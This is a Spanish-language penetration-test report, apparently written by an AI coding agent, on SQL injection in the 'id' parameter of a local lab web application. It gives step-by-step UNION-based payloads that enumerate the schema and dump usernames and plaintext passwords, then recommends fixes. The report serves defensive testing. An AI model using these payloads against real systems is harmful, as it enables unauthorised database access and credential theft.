# Informe de Auditoría de Seguridad: SQL Injection
**Objetivo:** http://web.dev.local:8083  
**Fecha:** 2026-04-30 15:08:08  
**Analista:** GitHub Copilot CLI  

---

## Resumen Ejecutivo

Se identificó y explotó exitosamente una vulnerabilidad crítica de **SQL Injection** en el parámetro `id` del formulario de búsqueda de usuarios. La explotación permitió extraer credenciales completas de todos los usuarios de la base de datos.

---

## Descripción de la Vulnerabilidad

| Campo | Detalle |
|-------|---------|
| **Tipo** | SQL Injection (Error-Based / UNION-Based) |
| **Severidad** | Crítica (CVSS 9.8) |
| **Parámetro vulnerable** | `id` (GET) |
| **URL afectada** | `http://web.dev.local:8083/?id=...&Submit=Submit` |
| **Base de datos** | MariaDB |
| **Base de datos objetivo** | `sqli_demo` |
| **Usuario de BD** | `root@172.18.0.3` |

---

## Prueba de Concepto

### 1. Detección de la Vulnerabilidad

Al enviar una comilla simple (`'`) en el parámetro `id`, el servidor devuelve un error de sintaxis SQL que confirma la inyección:

**Payload:**
```
GET /?id=1'&Submit=Submit
```

**Respuesta del servidor:**
```
Fatal error: Uncaught mysqli_sql_exception: You have an error in your SQL syntax; 
check the manual that corresponds to your MariaDB server version for the right syntax 
to use near ''1''' at line 1 in /var/www/html/low.php:11
```

El error revela:
- Motor de base de datos: **MariaDB**
- Archivo fuente: `/var/www/html/low.php` (línea 11)
- La consulta vulnerable no usa sentencias preparadas

---

### 2. Determinación del Número de Columnas

```
GET /?id=1' ORDER BY 2-- -&Submit=Submit   → Éxito (2 columnas)
GET /?id=1' UNION SELECT 1,2-- -&Submit=Submit → Confirmado: 2 columnas visibles
```

---

### 3. Extracción de Información del Servidor

**Payload:**
```sql
0' UNION SELECT database(),user()-- -
```

**Resultado:**
- Base de datos activa: `sqli_demo`
- Usuario de conexión: `root@172.18.0.3`

---

### 4. Enumeración de Tablas

**Payload:**
```sql
0' UNION SELECT table_name,table_schema FROM information_schema.tables WHERE table_schema=database()-- -
```

**Resultado:**
- Tabla encontrada: `users` (esquema: `sqli_demo`)

---

### 5. Enumeración de Columnas de la Tabla `users`

**Payload:**
```sql
0' UNION SELECT column_name,data_type FROM information_schema.columns WHERE table_name='users' AND table_schema=database()-- -
```

**Columnas descubiertas:**
| Columna | Tipo |
|---------|------|
| user_id | int |
| first_name | varchar |
| last_name | varchar |
| username | varchar |
| password | varchar |
| email | varchar |

---

### 6. Extracción de Credenciales

**Payload:**
```sql
0' UNION SELECT CONCAT(username,':',password),email FROM users-- -
```

**Credenciales extraídas:**

| Usuario | Contraseña | Email |
|---------|------------|-------|
| admin | password123 | admin@example.com |
| jsmith | secret456 | jane@example.com |
| bjohnson | mypass789 | bob@example.com |
| awilliams | qwerty123 | alice@example.com |
| cbrown | password | charlie@example.com |
| ddavis | secure123 | diana@example.com |
| emiller | hackme | eve@example.com |
| fwilson | admin123 | frank@example.com |

> ⚠️ **Las contraseñas se almacenan en texto plano**, lo que agrava enormemente el impacto.

---

## Causa Raíz

El archivo `/var/www/html/low.php` construye la consulta SQL concatenando directamente el input del usuario sin validación ni uso de sentencias preparadas:

```php
// Código vulnerable (inferido del error y comportamiento)
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id'";
$result = mysqli_query($conn, $query);
```

---

## Impacto

- **Confidencialidad:** Total compromiso — todas las credenciales de usuarios expuestas.
- **Integridad:** El atacante podría modificar, insertar o eliminar datos.
- **Disponibilidad:** El atacante conecta como `root`, pudiendo destruir la BD.
- **Escalada:** Las contraseñas en texto plano facilitan ataques de reutilización de credenciales.

---

## Recomendaciones

1. **Usar sentencias preparadas (Prepared Statements):**
   ```php
   $stmt = $conn->prepare("SELECT first_name, last_name FROM users WHERE user_id = ?");
   $stmt->bind_param("i", $id);
   $stmt->execute();
   ```

2. **Validar y sanitizar entradas:** Verificar que el parámetro `id` sea un entero.

3. **Principio de mínimo privilegio:** La conexión a BD no debe usar `root`; crear un usuario con permisos limitados (solo SELECT).

4. **Hashear contraseñas:** Usar `bcrypt` o `argon2` para almacenar contraseñas.

5. **Manejo de errores:** Deshabilitar la visualización de errores en producción (`display_errors = Off`).

6. **WAF:** Implementar un Web Application Firewall para detectar patrones de inyección.

---

## Conclusión

La aplicación web en `http://web.dev.local:8083` presenta una vulnerabilidad crítica de SQL Injection sin ningún control de seguridad. La explotación es trivial y permite el compromiso total de la base de datos incluyendo la extracción de credenciales de 8 usuarios en texto plano.
